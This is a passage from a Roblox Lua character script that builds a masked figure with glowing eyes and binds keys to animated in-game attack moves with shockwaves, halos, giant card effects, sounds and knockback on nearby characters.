	maskweld.C0 = CFrame.new(0,-.555,0) * CFrame.Angles(math.rad(90),0,0)
	mMask = Instance.new("SpecialMesh", mask)
	mMask.MeshType = "FileMesh"
	mMask.Scale = Vector3.new(0.13, 0.13, 0.1)
	mMask.MeshId,mMask.TextureId = 'http://www.roblox.com/asset/?id=5158270','http://www.roblox.com/asset/?id=9543585'

	eyo1 = Instance.new("Part",Head)
	eyo1.BrickColor = BrickColor.new("White")
	eyo1.Material = "Neon"
	eyo1.Shape = "Ball"
	eyo1.Name = "eyo1"
	eyo1.CanCollide = false
	eyo1.Size = Vector3.new(0.33, 0.33, 0.33)
	eyo1weld = weldBetween(eyo1,Head)
	eyo1weld.C0 = CFrame.new(.215,-.05,.52)

	light = Instance.new("PointLight", eyo1)
	light.Color = Color3.new(1,1,1)
	light.Range = 3
	light.Brightness = 4
	light.Enabled = true

	eyo2 = Instance.new("Part",Head)
	eyo2.BrickColor = BrickColor.new("White")
	eyo2.Material = "Neon"
	eyo2.Shape = "Ball"
	eyo2.Name = "eyo2"
	eyo2.CanCollide = false
	eyo2.Size = Vector3.new(0.33, 0.33, 0.33)
	eyo2weld = weldBetween(eyo2,Head)
	eyo2weld.C0 = CFrame.new(-.215,-.05,.52)

	light2 = Instance.new("PointLight", eyo2)
	light2.Color = Color3.new(1,1,1)
	light2.Range = 3
	light2.Brightness = 4
	light2.Enabled = true

	function SOUND(PARENT,ID,VOL,LOOP,REMOVE)
		so = Instance.new("Sound")
		so.Parent = PARENT
		so.SoundId = "rbxassetid://"..ID
		so.Volume = VOL
		so.Looped = LOOP
		so:Play()
		removeuseless:AddItem(so,REMOVE)
	end


	mouse.KeyDown:connect(function(Press)
		Press=Press:lower()
		if Press=='r' then
			if levitate then return end
			if debounce then return end
			debounce = true
			attacking = true
			appi = true
			ws = 15
			coroutine.wrap(function()
				while appi do
					wait()
					if Root.Velocity.Magnitude < 2 and attacking == true then
						position = "Idle2"
					end
				end
			end)()
			coroutine.wrap(function()
				while appi do
					wait()
					settime = 0.05
					sine = sine + change
					if position == "Idle2" and attacking == true and appi == true then
						change = .4
						LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
						RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
						LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.5,.6,-.5) * CFrame.Angles(math.rad(30),math.rad(-5 + 1 * math.sin(sine/12)),math.rad(-40 + 2 * math.sin(sine/12))), 0.3)
						LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(.2,1.2,-.3),.3)
						ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2 + -.1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0),math.rad(25),math.rad(0)),.3)
						RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.3, 2 - .1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10)), 0.3)
						LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.3, 2.0 - .1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(10)), 0.3)
					end
				end
			end)()
			for i = 1, 20 do
				ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2 + -.1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0),math.rad(25),math.rad(0)),.3)
				RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.3, 2 - .1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10)), 0.3)
				LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.3, 2.0 - .1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(10)), 0.3)
				RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(0,1.5,-.1),.5)
				RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,0,0) * CFrame.Angles(math.rad(180),math.rad(10),math.rad(10)),.3)
				swait()
			end
			SOUND(RightArm,342337569,6,false,1)
			coroutine.wrap(function()
				for i = 1, 9 do
					RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(.1,1.6,-.1),.5)
					RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,0,0) * CFrame.Angles(math.rad(180),math.rad(10),math.rad(15)),.3)
					swait()
				end
				for i = 1, 9 do
					RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(0,1.5,-.1),.5)
					RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,0,0) * CFrame.Angles(math.rad(180),math.rad(10),math.rad(10)),.3)
					swait()
				end
			end)()
			shockwave = Instance.new("Part",Torso)
			shockwave.Shape = "Ball"
			shockwave.Size = Vector3.new(1,1,1)
			shockwave.BrickColor = BrickColor.new("White")
			shockwave.Material = "Neon"
			shockwave.CFrame = Torso.CFrame
			shockwave.CanCollide = false
			shockwave.Anchored = true
			coroutine.wrap(function()
				for i = 1, 20 do
					shockwave.Size = shockwave.Size + Vector3.new(1.8,1.8,1.8)
					shockwave.Transparency = shockwave.Transparency + 0.05
					wait()
				end
			end)()
			SOUND(Torso,1072606965,0,false,10)
			coroutine.wrap(function()
				for i = 1, 10 do
					so.Volume = so.Volume + 0.3
					wait()
				end
			end)()
			for i = 1, 35 do
				local Hit = damagealll(22,Torso.Position)	
				for _,v in pairs(Hit) do			
					v:FindFirstChildOfClass("Humanoid"):TakeDamage(0)
					vel = Instance.new("BodyVelocity",v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")) 
					vel.maxForce = Vector3.new(9999999999999,9999999999999,9999999999999)
					torso = v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")
					vel.velocity = CFrame.new(Torso.Position,torso.Position).lookVector*20
					removeuseless:AddItem(vel,.1)
				end
				wave = Instance.new("Part", Torso)
				wave.Size = Vector3.new(1, 1, 1)
				wave.Transparency = 0
				wave.BrickColor = BrickColor.new("White")
				wave.Anchored = true
				wave.CanCollide = false
				wave.CFrame = Root.CFrame * CFrame.new(0, -2.5, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))
				wavemesh = Instance.new("SpecialMesh", wave) 
				wavemesh.MeshId = "rbxassetid://20329976" 
				wavemesh.Scale = Vector3.new(1, 1, 1)
				table.insert(th2,wave)
				table.insert(SlowlyFade,wave)
				table.insert(th5,wavemesh)
				removeuseless:AddItem(wave,2)
				CardStorm = Instance.new("Part",Torso)
				CardStorm.Size = Vector3.new(.1,.1,.1)
				CardStorm.CFrame = Root.CFrame * CFrame.new(0,3.2,0)
				CardStorm.Anchored = true
				CardStormMesh = Instance.new("SpecialMesh", CardStorm)
				CardStormMesh.Scale = Vector3.new(1,1,1)
				CardStormMesh.MeshId = "rbxassetid://6512150"
				CardStormMesh.TextureId = "rbxassetid://55364685"
				table.insert(SlowlyFade,CardStorm)
				table.insert(m3,CardStormMesh)
				table.insert(th1,CardStorm)
				removeuseless:AddItem(CardStorm,3)
				wait(.1)
			end
			coroutine.wrap(function()
				for i = 1, 10 do
					so.Volume = so.Volume - 0.3
					wait()
				end
			end)()
			wait(1)
			ws = 10
			clean()
			attacking = false
			debounce = false
			appi = false
		end
	end)

	mouse.KeyDown:connect(function(Press)
		Press=Press:lower()
		if Press=='e' then
			if levitate then return end
			if debounce then return end
			attacking = true
			debounce = true
			damagedebounce = false
			clickdisallowance = true
			clickdebounce = false
			notallowed = true
			appi = true
			ws = 15
			coroutine.wrap(function()
				while appi do
					wait()
					if Root.Velocity.y > 1 and attacking == true then
						position = "Jump2"
					elseif Root.Velocity.y < -1 and attacking == true then
						position = "Falling2"
					elseif Root.Velocity.Magnitude < 2 and attacking == true then
						position = "Idle2"
					elseif Root.Velocity.Magnitude > 2 and attacking == true then
						position = "Walking2"
					end
				end
			end)()
			coroutine.wrap(function()
				while appi do
					wait()
					settime = 0.05
					sine = sine + change
					if position == "Jump2" and attacking == true and appi == true then
						change = 1
						LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
						RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
						RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
						ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 0.4)
						RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.4,.1,-.2) * CFrame.Angles(math.rad(20),math.rad(3),math.rad(4)), 0.4)
						RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(10), math.rad(0), math.rad(0)), 0.4)
						LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.0, .9) * CFrame.Angles(math.rad(20), math.rad(0), math.rad(0)), 0.4)
					elseif position == "Falling2" and attacking == true and appi == true then
						change = 1
						LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
						RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
						RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
						RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(8), math.rad(4), math.rad(0)), 0.2)
						LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.0, .9) * CFrame.Angles(math.rad(14), math.rad(-4), math.rad(0)), 0.2)
						RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.6, 0.5, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-20)), 0.2)
					elseif position == "Idle2" and attacking == true and appi == true then
						change = .4
						LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
						RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
						RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,.6,-.5) * CFrame.Angles(math.rad(32),math.rad(5 - 1 * math.sin(sine/12)),math.rad(40 - 2 * math.sin(sine/12))), 0.3)
						RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(-.2,1.2,-.3),.3)
						ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2 + -.1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0),math.rad(25),math.rad(0)),.3)
						RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.3, 2, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10)), 0.3)
						LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.3, 2.0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(10)), 0.3)
					elseif position == "Walking2" and attacking == true and appi == true then
						change = .8
						LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
						RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
						RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,.6,-.5) * CFrame.Angles(math.rad(32),math.rad(5 - 1 * math.sin(sine/12)),math.rad(40 - 2 * math.sin(sine/12))), 0.3)
						RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(-.2,1.2,-.3),.3)
						ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,math.rad(0) + Root.RotVelocity.Y/30,math.sin(25*math.sin(sine/8))),.3)
						RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 1.92 - 0.35 * math.sin(sine/8)/2.8, 0.2 - math.sin(sine/8)/3.4) * CFrame.Angles(math.rad(10) + -math.sin(sine/8)/2.3, math.rad(0)*math.sin(sine/1), math.rad(0)  + RightLeg.RotVelocity.Y / 30, math.sin(25 * math.sin(sine/8))), 0.3)
						LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.92 + 0.35 * math.sin(sine/8)/2.8, 0.2 + math.sin(sine/8)/3.4) * CFrame.Angles(math.rad(10) - -math.sin(sine/8)/2.3, math.rad(0)*math.sin(sine/1), math.rad(0)  + LeftLeg.RotVelocity.Y / 30, math.sin(25 * math.sin(sine/8))), 0.3)
					end
				end
			end)()
			coroutine.wrap(function()
				for i = 1, 40 do
					LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(0,0,0),.5)
					LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.2,1.5,0) * CFrame.Angles(math.rad(180 - 7 * math.sin(sine/6)),math.rad(7 * math.sin(sine/6)),math.rad(7*math.sin(sine/6))), 0.5)
					swait()
				end
			end)()
			haloh = Instance.new("Part", Torso)
			haloh.Size = Vector3.new(1,1,1)
			haloh.Anchored = false
			haloh.Transparency = 1
			haloh.CanCollide = false
			halohweld = weldBetween(haloh,Torso)
			halohweld.C0 = CFrame.new(0,0,0)
			n = 0
			x = 0
			tab={}
			tab2={}
			SOUND(Torso,1882057730,6,false,2)
			for i = 1, 20 do
				n = n + 20
				x = x + 5
				halo = Instance.new("Part", Torso)
				halo.Size = Vector3.new(0.71, 0.07, 0.99)
				halo.Transparency = 1
				halo.CanCollide = false
				halo.Material = "Neon"
				halo.BrickColor = BrickColor.new("White")
				halow = weldBetween(halo,haloh)
				halow.C0 = CFrame.new(-4,0,0) * CFrame.Angles(math.rad(90),math.rad(n),math.rad(0))
				table.insert(FadeIn,halo)
				table.insert(tab,halow)
				table.insert(tab2,halo)
				wait()
			end
			ws = 15
			clickdisallowance = false
			coroutine.wrap(function()
				g1 = Instance.new("BodyGyro", Root)
				g1.D = 175
				g1.P = 20000
				g1.MaxTorque = Vector3.new(0,9000,0)
				while notallowed do
					ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 0.3)
					g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.2)
					LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1, 1.35, 0.4) * CFrame.Angles(math.rad(-90 - 2 * math.sin(sine/12)), math.rad(3), math.rad(4)), 0.3)
					swait()
				end
			end)()
			coroutine.wrap(function()
				mouse.Button1Down:connect(function()
					if clickdisallowance then return end
					if clickdebounce then return end
					wait(.2)
					clickdebounce = true
					notallowed = false
				end)
			end)()
			while notallowed do
				for i,v in pairs(tab) do
					v.C0 = v.C0 * CFrame.Angles(math.rad(0),math.rad(0 + 1.2),math.rad(0))
				end
				swait()
			end
			appi = false
			ws = 15
			for i = 1, 15 do
				RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.3, 2, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10)), 0.3)
				LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.3, 2.0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(10)), 0.3)
				ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2, 0) * CFrame.Angles(math.rad(0), math.rad(50), math.rad(0)), 0.3)
				LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1, 1.35, 0.4) * CFrame.Angles(math.rad(-50 - 2 * math.sin(sine/12)), math.rad(12), math.rad(9)), 0.3)
				LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(-.65, .6, 1) * CFrame.Angles(0,0,0),.3)
				swait()
			end
			for i,v in pairs(tab) do
				v:Remove()
			end
			for i,v in pairs(tab2) do
				removeuseless:AddItem(v,6)
				MAKETRAIL(v,Vector3.new(.1,0,0),Vector3.new(-.1,0,0),.8,ColorSequence.new(BrickColor.new("White").Color,BrickColor.new("Really black").Color))
				BodyGyro=Instance.new('BodyGyro',v)
				BodyGyro.maxTorque=Vector3.new(math.huge,math.huge,math.huge)
				BodyGyro.P=2e4
				removeuseless:AddItem(BodyGyro,.1)
				PB2 = Instance.new("BodyVelocity", v)
				PB2.MaxForce = Vector3.new(999999, 999999, 999999)
				v.CFrame = CFrame.new(v.Position,mouse.Hit.p)
				PB2.Velocity = v.CFrame.lookVector * 80
			end
			SOUND(Torso,1499747506,3,false,1)
			for i,v in pairs(tab2) do
				v.Touched:connect(function(hit)
					if hit.Parent:IsA("Part") then
					elseif hit.Parent:IsA("SpecialMesh") then
					elseif hit.Parent.Name == game.Players.LocalPlayer.Name then
					elseif hit.Parent:findFirstChildOfClass("Humanoid") then
						if damagedebounce == true then return end
						damagedebounce = true
						Slachtoffer = hit.Parent:findFirstChildOfClass("Humanoid")
						tor = hit.Parent:FindFirstChild("Torso") or hit.Parent:FindFirstChild("UpperTorso")
						Slachtoffer:TakeDamage(0)
						SOUND(tor,694703797,6,false,1)
						wait(.1)
						damagedebounce = false
					end
				end)
			end
			for i = 1, 20 do
				RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.3, 2, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10)), 0.3)
				LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.3, 2.0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(10)), 0.3)
				ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2, 0) * CFrame.Angles(math.rad(0), math.rad(-25), math.rad(0)), 0.3)
				LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.3)
				LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1, 1.35, 0.4) * CFrame.Angles(math.rad(-90 - 2 * math.sin(sine/12)), math.rad(-15), math.rad(4)), 0.3)
				swait()
			end
			clean()
			g1:Remove()
			haloh:Remove()
			attacking = false
			debounce = false
			damagedebounce = false
			clickdebounce = false
			appi = false
			ws = 15
		end
	end)

	mouse.KeyDown:connect(function(Press)
		Press=Press:lower()
		if Press=='y' then
			if levitate then return end
			if debounce then return end
			clickdisallowance = true
			clickdebounce = false
			debounce = true
			attacking = true
			appi = true
			ws = 15
			coroutine.wrap(function()
				while appi do
					wait()
					if Root.Velocity.y > 1 and attacking == true then
						position = "Jump2"
					elseif Root.Velocity.y < -1 and attacking == true then
						position = "Falling2"
					elseif Root.Velocity.Magnitude < 2 and attacking == true then
						position = "Idle2"
					elseif Root.Velocity.Magnitude > 2 and attacking == true then
						position = "Walking2"
					end
				end
			end)()
			coroutine.wrap(function()
				while appi do
					wait()
					settime = 0.05
					sine = sine + change
					if position == "Jump2" and attacking == true and appi == true then
						change = 1
						LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
						RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
						LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
						ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 0.4)
						LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.4,.1,-.2) * CFrame.Angles(math.rad(20),math.rad(-3),math.rad(-4)), 0.4)
						RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(10), math.rad(0), math.rad(0)), 0.4)
						LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.0, .9) * CFrame.Angles(math.rad(20), math.rad(0), math.rad(0)), 0.4)
					elseif position == "Falling2" and attacking == true and appi == true then
						change = 1
						LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
						RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
						LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
						RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(8), math.rad(4), math.rad(0)), 0.2)
						LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.0, .9) * CFrame.Angles(math.rad(14), math.rad(-4), math.rad(0)), 0.2)
						LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.6, 0.5, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(20)), 0.2)
					elseif position == "Idle2" and attacking == true and appi == true then
						change = .4
						LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
						RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
						LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.5,.6,-.5) * CFrame.Angles(math.rad(30),math.rad(-5 + 1 * math.sin(sine/12)),math.rad(-40 + 2 * math.sin(sine/12))), 0.3)
						LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(.2,1.2,-.3),.3)
						ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2 + -.1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0),math.rad(25),math.rad(0)),.3)
						RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.3, 2 - .1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10)), 0.3)
						LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.3, 2.0 - .1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(10)), 0.3)
					elseif position == "Walking2" and attacking == true and appi == true then
						change = .8
						LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
						RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
						LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.5,.6,-.5) * CFrame.Angles(math.rad(30),math.rad(-5 + 1 * math.sin(sine/12)),math.rad(-40 + 2 * math.sin(sine/12))), 0.3)
						LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(.2,1.2,-.3),.3)
						ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,math.rad(0) + Root.RotVelocity.Y/30,math.cos(25*math.cos(sine/8))),.3)
						RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 1.92 - 0.35 * math.cos(sine/8)/2.8, 0.2 - math.sin(sine/8)/3.4) * CFrame.Angles(math.rad(10) + -math.sin(sine/8)/2.3, math.rad(0)*math.cos(sine/1), math.rad(0)  + RightLeg.RotVelocity.Y / 30, math.cos(25 * math.cos(sine/8))), 0.3)
						LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.92 + 0.35 * math.cos(sine/8)/2.8, 0.2 + math.sin(sine/8)/3.4) * CFrame.Angles(math.rad(10) - -math.sin(sine/8)/2.3, math.rad(0)*math.cos(sine/1), math.rad(0)  + LeftLeg.RotVelocity.Y / 30, math.cos(25 * math.cos(sine/8))), 0.3)
					end
				end
			end)()
			bigcard = Instance.new("Part",Torso)
			bigcard.Material = "Neon"
			bigcard.Transparency = 1
			bigcard.BrickColor = BrickColor.new("White")
			bigcard.Size = Vector3.new(15.65, 23.84, 0.3)
			bigcard.CFrame = Root.CFrame * CFrame.new(0,18,0)
			bigcard.Anchored = true
			SOUND(bigcard,236989198,6,false,1)
			ace = aces[math.random(1,#aces)]
			acer = Instance.new("Decal",bigcard)
			acer.Texture = "rbxassetid://"..ace
			acer.Transparency = 1
			acer.Face = "Front"
			ace2 = acer:Clone()
			ace2.Parent = bigcard
			ace2.Face = "Back"
			table.insert(FadeIn,acer)
			table.insert(FadeIn,ace2)
			table.insert(FadeIn,bigcard)
			for i = 1, 30 do
				RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(0,1.5,-.1),.5)
				RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,0,0) * CFrame.Angles(math.rad(180),math.rad(10),math.rad(10)),.3)
				swait()
			end
			ws = 15
			g1 = Instance.new("BodyGyro", Root)
			g1.D = 175
			g1.P = 20000
			g1.MaxTorque = Vector3.new(0,9000,0)
			clickdisallowance = false
			coroutine.wrap(function()
				mouse.Button1Down:connect(function()
					if clickdisallowance then return end
					if clickdebounce then return end
					wait(.2)
					clickdebounce = true
				end)
			end)()
			while not clickdebounce do
				g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.2)
				bigcard.CFrame = Root.CFrame * CFrame.new(0,18,0)
				RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,0,0) * CFrame.Angles(math.rad(180),math.rad(10 + 2 *math.sin(sine/12)),math.rad(10 - 2*math.sin(sine/12))),.3)
				swait()
			end
			g1:Remove()
			ws = 15
			for i = 1, 13 do
				bigcard.CFrame = bigcard.CFrame:lerp(Root.CFrame * CFrame.new(0,18,3) * CFrame.Angles(math.rad(10),0,0),.3)
				RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,0,0.2) * CFrame.Angles(math.rad(160),math.rad(10),math.rad(10)),.3)
				swait()
			end
			locationpart = Instance.new("Part",bigcard)
			locationpart.Size = Vector3.new(1,1,1)
			locationpart.Transparency = 1
			locationpart.CanCollide = false
			locationpart.Anchored = true
			locationpart.CFrame = Root.CFrame * CFrame.new(0,-3,-21)
			shockwave = Instance.new("Part", Torso)
			shockwave.Size = Vector3.new(1,1,1)
			shockwave.CanCollide = false
			shockwave.Anchored = true
			shockwave.Transparency = 0
			shockwave.BrickColor = BrickColor.new("White")
			shockwave.CFrame = CFrame.new(locationpart.Position)
			shockwavemesh = Instance.new("SpecialMesh", shockwave)
			shockwavemesh.Scale = Vector3.new(5,2,5)
			shockwavemesh.MeshId = "rbxassetid://20329976"
			removeuseless:AddItem(shockwave,4)
			shockwave2 = Instance.new("Part", Torso)
			shockwave2.Size = Vector3.new(1,1,1)
			shockwave2.CanCollide = false
			shockwave2.Anchored = true
			shockwave2.Transparency = 0
			shockwave2.BrickColor = BrickColor.new("White")
			shockwave2.CFrame = CFrame.new(locationpart.Position)
			shockwavemesh2 = Instance.new("SpecialMesh", shockwave2)
			shockwavemesh2.Scale = Vector3.new(5,2,5)
			shockwavemesh2.MeshId = "rbxassetid://20329976"
			removeuseless:AddItem(shockwave2,4)
			shockwave3 = Instance.new("Part", Torso)
			shockwave3.Size = Vector3.new(1,1,1)
			shockwave3.CanCollide = false
			shockwave3.Anchored = true
			shockwave3.Transparency = 0
			shockwave3.BrickColor = BrickColor.new("White")
			shockwave3.CFrame = CFrame.new(locationpart.Position)
			shockwavemesh3 = Instance.new("SpecialMesh", shockwave3)
			shockwavemesh3.Scale = Vector3.new(5,2,5)
			shockwavemesh3.MeshId = "rbxassetid://20329976"
			removeuseless:AddItem(shockwave3,4)
			shockwave4 = Instance.new("Part", Torso)
			shockwave4.Size = Vector3.new(1,1,1)
			shockwave4.CanCollide = false
			shockwave4.Anchored = true
			shockwave4.Transparency = 0
			shockwave4.BrickColor = BrickColor.new("White")
			shockwave4.CFrame = CFrame.new(locationpart.Position)
			shockwavemesh4 = Instance.new("SpecialMesh", shockwave4)
			shockwavemesh4.Scale = Vector3.new(5,2,5)
			shockwavemesh4.MeshId = "rbxassetid://20329976"
			removeuseless:AddItem(shockwave4,4)
			Hit = damagealll(20,locationpart.Position)
			for _,v in pairs(Hit) do			
				v:FindFirstChildOfClass("Humanoid"):TakeDamage(0)
				vel = Instance.new("BodyVelocity",v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")) 
				vel.maxForce = Vector3.new(9999999999999,9999999999999,9999999999999)
				torso = v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")
